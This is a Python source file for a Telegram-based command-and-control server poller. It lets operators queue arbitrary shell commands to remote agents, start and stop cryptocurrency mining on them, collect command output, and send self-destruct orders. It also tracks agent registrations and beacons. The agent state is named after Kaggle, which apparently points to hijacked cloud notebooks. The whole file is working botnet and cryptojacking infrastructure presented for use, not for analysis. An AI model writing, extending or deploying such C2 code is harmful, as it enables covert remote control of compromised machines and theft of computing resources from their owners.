#!/usr/bin/env python3
"""
Telegram C2 Poller for Server
Polls Telegram for agent messages and processes commands
"""

import json
import time
import threading
import urllib.request
import ssl
from datetime import datetime

class TelegramPoller:
    """Polls Telegram for C2 messages"""
    
    def __init__(self, bot_token, server):
        self.bot_token = bot_token
        self.server = server  # Reference to C2 server
        self.api_url = f"https://api.telegram.org/bot{bot_token}"
        self.last_update_id = 0
        self.running = False
        self.thread = None
        self._ssl_context = ssl.create_default_context()
        self._ssl_context.check_hostname = False
        self._ssl_context.verify_mode = ssl.CERT_NONE
        self.admin_chat_ids = set()  # Admin chat IDs for sending commands
    
    def _request(self, method, data=None):
        """Make request to Telegram API"""
        url = f"{self.api_url}/{method}"
        print(f"[POLLER] API request: {method}")
        
        if data:
            data = json.dumps(data).encode('utf-8')
            req = urllib.request.Request(
                url,
                data=data,
                headers={'Content-Type': 'application/json'}
            )
        else:
            req = urllib.request.Request(url)
        
        try:
            resp = urllib.request.urlopen(req, timeout=30, context=self._ssl_context)
            result = json.loads(resp.read().decode('utf-8'))
            print(f"[POLLER] API response: {method} -> ok={result.get('ok')}")
            return result
        except Exception as e:
            print(f"[POLLER] API error: {method} -> {e}")
            return {"ok": False, "error": str(e)}
    
    def send_message(self, chat_id, text, parse_mode=None):
        """Send message to specific chat"""
        print(f"[POLLER] Sending message to chat_id={chat_id} ({len(text)} chars)")
        data = {
            "chat_id": chat_id,
            "text": text
        }
        if parse_mode:
            data["parse_mode"] = parse_mode
        
        result = self._request("sendMessage", data)
        if result.get("ok"):
            print(f"[POLLER] ✓ Message sent to {chat_id}")
        else:
            print(f"[POLLER] ✗ Failed to send message: {result.get('error')}")
        return result
    
    def broadcast_to_admins(self, text):
        """Send message to all admin chats"""
        for chat_id in self.admin_chat_ids:
            self.send_message(chat_id, text)
    
    def process_command(self, chat_id, text, from_user):
        """Process admin commands"""
        parts = text.split()
        cmd = parts[0].lower()
        print(f"[POLLER] Command from {chat_id}: {cmd} (user: {from_user.get('username', '?')})")
        
        if cmd == "/start":
            self.send_message(chat_id, 
                "🤖 C2 Control Bot\n\n"
                "Commands:\n"
                "/agents - List all agents\n"
                "/cmd <agent_id> <command> - Send command\n"
                "/mine <agent_id> <start|stop|status> - Mining control\n"
                "/results <agent_id> - Show agent results\n"
                "/kill <agent_id> - Kill agent\n"
                "/stats - Mining statistics\n"
                "/status - Server status\n"
                "/help - Show this message"
            )
        
        elif cmd == "/agents":
            # Get agents from kaggle_agents_state
            agents = []
            if hasattr(self.server, 'kaggle_agents_state'):
                with self.server.kaggle_agents_state_lock:
                    for aid, state in list(self.server.kaggle_agents_state.items()):
                        agents.append({
                            "id": aid,
                            "status": "online" if time.time() - state.get("last_checkin", 0) < 120 else "offline",
                            "last_checkin": state.get("last_checkin", 0),
                            "pending": len(state.get("pending_commands", []))
                        })
            
            msg = f"📋 AGENTS ({len(agents)})\n"
            for agent in agents[:20]:
                status_emoji = "🟢" if agent["status"] == "online" else "🔴"
                msg += f"\n{status_emoji} {agent['id']}"
                msg += f"\n   Pending: {agent['pending']}"
            self.send_message(chat_id, msg)
        
        elif cmd == "/cmd":
            if len(parts) >= 3:
                agent_id = parts[1]
                command = " ".join(parts[2:])
                
                # Store command in kaggle_agents_state
                if hasattr(self.server, 'kaggle_agents_state'):
                    with self.server.kaggle_agents_state_lock:
                        if agent_id not in self.server.kaggle_agents_state:
                            self.server.kaggle_agents_state[agent_id] = {"pending_commands": [], "results": []}
                        
                        self.server.kaggle_agents_state[agent_id].setdefault("pending_commands", []).append({
                            "id": f"cmd-{int(time.time())}",
                            "type": "shell",
                            "payload": command,
                            "timestamp": time.time()
                        })
                
                self.send_message(chat_id, f"✅ Command queued for {agent_id}: {command}")
            else:
                self.send_message(chat_id, "Usage: /cmd <agent_id> <command>")
        
        elif cmd == "/mine":
            if len(parts) >= 3:
                agent_id = parts[1]
                action = parts[2].lower()
                
                if hasattr(self.server, 'kaggle_agents_state'):
                    with self.server.kaggle_agents_state_lock:
                        if agent_id not in self.server.kaggle_agents_state:
                            self.server.kaggle_agents_state[agent_id] = {"pending_commands": [], "results": []}
                        
                        self.server.kaggle_agents_state[agent_id].setdefault("pending_commands", []).append({
                            "id": f"mine-{int(time.time())}",
                            "type": "mining",
                            "payload": action,
                            "timestamp": time.time()
                        })
                
                self.send_message(chat_id, f"⛏ Mining {action} queued for {agent_id}")
            else:
                self.send_message(chat_id, "Usage: /mine <agent_id> <start|stop|status>")
        
        elif cmd == "/stats":
            # Get mining stats from kaggle_agents_state
            stats = {"total_agents": 0, "online": 0, "mining": 0}
            if hasattr(self.server, 'kaggle_agents_state'):
                with self.server.kaggle_agents_state_lock:
                    stats["total_agents"] = len(self.server.kaggle_agents_state)
                    for aid, state in self.server.kaggle_agents_state.items():
                        if time.time() - state.get("last_checkin", 0) < 120:
                            stats["online"] += 1
                        if state.get("info", {}).get("mining"):
                            stats["mining"] += 1
            
            msg = f"📊 C2 STATISTICS\n\n"
            msg += f"Total Agents: {stats['total_agents']}\n"
            msg += f"Online: {stats['online']}\n"
            msg += f"Mining: {stats['mining']}"
            self.send_message(chat_id, msg)
        
        elif cmd == "/status":
            msg = f"📊 C2 SERVER STATUS\n"
            msg += f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            msg += f"Admin chats: {len(self.admin_chat_ids)}\n"
            self.send_message(chat_id, msg)
        
        elif cmd == "/results":
            if len(parts) >= 2:
                agent_id = parts[1]
                results = []
                if hasattr(self.server, 'kaggle_agents_state'):
                    with self.server.kaggle_agents_state_lock:
                        agent = self.server.kaggle_agents_state.get(agent_id, {})
                        results = agent.get("results", [])[-10:]  # Last 10 results
                
                if results:
                    msg = f"📋 RESULTS for {agent_id}\n"
                    for r in results:
                        ts = datetime.fromtimestamp(r.get("timestamp", 0)).strftime('%H:%M:%S')
                        msg += f"\n[{ts}] {r.get('cmd_id', '?')}\n"
                        msg += f"  {r.get('result', '')[:200]}...\n"
                else:
                    msg = f"No results for {agent_id}"
                self.send_message(chat_id, msg)
            else:
                self.send_message(chat_id, "Usage: /results <agent_id>")
        
        elif cmd == "/kill":
            if len(parts) >= 2:
                agent_id = parts[1]
                if hasattr(self.server, 'kaggle_agents_state'):
                    with self.server.kaggle_agents_state_lock:
                        if agent_id not in self.server.kaggle_agents_state:
                            self.server.kaggle_agents_state[agent_id] = {"pending_commands": [], "results": []}
                        self.server.kaggle_agents_state[agent_id].setdefault("pending_commands", []).append({
                            "id": f"kill-{int(time.time())}",
                            "type": "kill",
                            "payload": "self-destruct",
                            "timestamp": time.time()
                        })
                self.send_message(chat_id, f"💀 Kill command sent to {agent_id}")
            else:
                self.send_message(chat_id, "Usage: /kill <agent_id>")
        
        elif cmd == "/help":
            self.send_message(chat_id,
                "📖 C2 Bot Help\n\n"
                "/start - Initialize bot\n"
                "/agents - List connected agents\n"
                "/cmd <id> <cmd> - Send command to agent\n"
                "/status - Server status\n"
                "/help - This message"
            )
    
    def process_agent_registration(self, text):
        """Process agent registration from Telegram message"""
        import re
        print("[POLLER] Processing agent registration...")
        
        # Match both emoji format and text format
        agent_id_match = re.search(r'(?:🆔|ID:)\s*([^\n]+)', text)
        hostname_match = re.search(r'(?:🖥|Hostname:)\s*([^\n]+)', text)
        platform_match = re.search(r'(?:💻|Platform:)\s*([^\n]+)', text)
        cpu_match = re.search(r'(?:🔧\s*CPU:|CPU Cores:)\s*(\d+)', text)
        
        if agent_id_match:
            agent_data = {
                "id": agent_id_match.group(1).strip(),
                "hostname": hostname_match.group(1).strip() if hostname_match else "unknown",
                "platform_type": platform_match.group(1).strip() if platform_match else "unknown",
                "cpu_count": int(cpu_match.group(1)) if cpu_match else 0,
                "status": "active",
                "last_seen": time.time(),
                "source": "telegram"
            }
            
            print(f"[POLLER] ✓ Agent registered: {agent_data['id']} (hostname={agent_data['hostname']}, cpu={agent_data['cpu_count']})")
            
            # Register in server
            if hasattr(self.server, 'register_agent'):
                self.server.register_agent(agent_data)
            
            # Notify admins
            self.broadcast_to_admins(f"✅ Agent registered via Telegram: {agent_data['id']}")
        else:
            print("[POLLER] ✗ Registration failed: no agent_id found in message")
    
    def process_agent_beacon(self, text):
        """Process agent beacon from Telegram message"""
        import re
        print("[POLLER] Processing agent beacon...")
        
        # Match both emoji format and text format
        agent_id_match = re.search(r'(?:🟢\s*BEACON:|BEACON:)\s*([^\n]+)', text)
        status_match = re.search(r'Status:\s*([^\n]+)', text)
        
        if agent_id_match:
            agent_id = agent_id_match.group(1).strip()
            status = status_match.group(1).strip() if status_match else "active"
            
            print(f"[POLLER] ✓ Beacon from {agent_id} (status={status})")
            
            # Update agent in server
            if hasattr(self.server, 'update_agent'):
                self.server.update_agent(agent_id, {
                    "status": status,
                    "last_seen": time.time()
                })
            
            # Also update kaggle_agents_state if available
            if hasattr(self.server, 'kaggle_agents_state'):
                with self.server.kaggle_agents_state_lock:
                    if agent_id in self.server.kaggle_agents_state:
                        self.server.kaggle_agents_state[agent_id].update({
                            "last_checkin": time.time(),
                            "status": "online"
                        })
        else:
            print("[POLLER] ✗ Beacon failed: no agent_id found")
    
    def process_agent_result(self, text):
        """Process agent result from Telegram message"""
        import re
        
        agent_id_match = re.search(r'RESULT: ([^\n]+)', text)
        task_match = re.search(r'Task: ([^\n]+)', text)
        result_match = re.search(r'Result: (.+)', text, re.DOTALL)
        
        if agent_id_match:
            agent_id = agent_id_match.group(1).strip()
            task_id = task_match.group(1).strip() if task_match else "unknown"
            result_data = result_match.group(1).strip() if result_match else ""
            
            # Store result in kaggle_agents_state
            if hasattr(self.server, 'kaggle_agents_state'):
                with self.server.kaggle_agents_state_lock:
                    if agent_id not in self.server.kaggle_agents_state:
                        self.server.kaggle_agents_state[agent_id] = {"pending_commands": [], "results": []}
                    
                    if "results" not in self.server.kaggle_agents_state[agent_id]:
                        self.server.kaggle_agents_state[agent_id]["results"] = []
                    
                    self.server.kaggle_agents_state[agent_id]["results"].append({
                        "cmd_id": task_id,
                        "result": result_data[:5000],  # Limit result size
                        "timestamp": time.time()
                    })
                    
                    # Keep only last 50 results
                    self.server.kaggle_agents_state[agent_id]["results"] = \
                        self.server.kaggle_agents_state[agent_id]["results"][-50:]
            
            # Notify admins
            self.broadcast_to_admins(f"📊 Result from {agent_id}: {task_id}")
    
    def process_update(self, update):
        """Process incoming Telegram update"""
        message = update.get("message", {})
        chat_id = message.get("chat", {}).get("id")
        text = message.get("text", "")
        from_user = message.get("from", {})
        
        # Add chat to admins if it's a private chat
        if message.get("chat", {}).get("type") == "private":
            self.admin_chat_ids.add(str(chat_id))
        
        # Process commands
        if text.startswith("/"):
            self.process_command(chat_id, text, from_user)
        elif "REGISTERED" in text:
            # Agent registration message
            self.process_agent_registration(text)
        elif "BEACON:" in text:
            # Agent beacon
            self.process_agent_beacon(text)
        elif "RESULT:" in text:
            # Agent result
            self.process_agent_result(text)
    
    def poll(self):
        """Poll for updates"""
        print("[POLLER] Starting poll loop...")
        while self.running:
            try:
                data = {
                    "offset": self.last_update_id + 1,
                    "limit": 100,
                    "timeout": 30  # Long polling
                }
                
                result = self._request("getUpdates", data)
                
                if result.get("ok"):
                    updates = result.get("result", [])
                    if updates:
                        print(f"[POLLER] Received {len(updates)} update(s)")
                    for update in updates:
                        self.last_update_id = update.get("update_id", 0)
                        self.process_update(update)
                
            except Exception as e:
                print(f"[POLLER] Poll error: {e}")
            
            time.sleep(1)
    
    def cleanup_dead_agents(self):
        """Remove agents offline > 10 minutes"""
        print("[POLLER] Starting cleanup thread...")
        while self.running:
            try:
                if hasattr(self.server, 'kaggle_agents_state'):
                    with self.server.kaggle_agents_state_lock:
                        dead = []
                        for aid, state in list(self.server.kaggle_agents_state.items()):
                            if time.time() - state.get("last_checkin", 0) > 600:  # 10 min
                                dead.append(aid)
                        
                        for aid in dead:
                            del self.server.kaggle_agents_state[aid]
                            print(f"[POLLER] Cleaned dead agent: {aid}")
                        
                        if dead:
                            print(f"[POLLER] Cleaned {len(dead)} dead agents total")
                            self.broadcast_to_admins(f"🧹 Cleaned {len(dead)} offline agents")
            except Exception as e:
                print(f"[POLLER] Cleanup error: {e}")
            
            time.sleep(300)  # Check every 5 min
    
    def start(self):
        """Start polling thread"""
        print("[POLLER] Initializing Telegram poller...")
        self.running = True
        self.thread = threading.Thread(target=self.poll, daemon=True)
        self.thread.start()
        
        # Start cleanup thread
        self.cleanup_thread = threading.Thread(target=self.cleanup_dead_agents, daemon=True)
        self.cleanup_thread.start()
        
        print("[POLLER] ✓ Telegram poller started with auto-cleanup")
    
    def stop(self):
        """Stop polling"""
        self.running = False
        if self.thread:
            self.thread.join(timeout=5)
        print("[TELEGRAM] Poller stopped")


def create_telegram_poller(bot_token, server):
    """Create and return Telegram poller"""
    return TelegramPoller(bot_token, server)


if __name__ == "__main__":
    print("Telegram C2 Poller")
    print("Requires: bot_token")
    print()
    print("Usage:")
    print("  poller = TelegramPoller(bot_token, server)")
    print("  poller.start()")
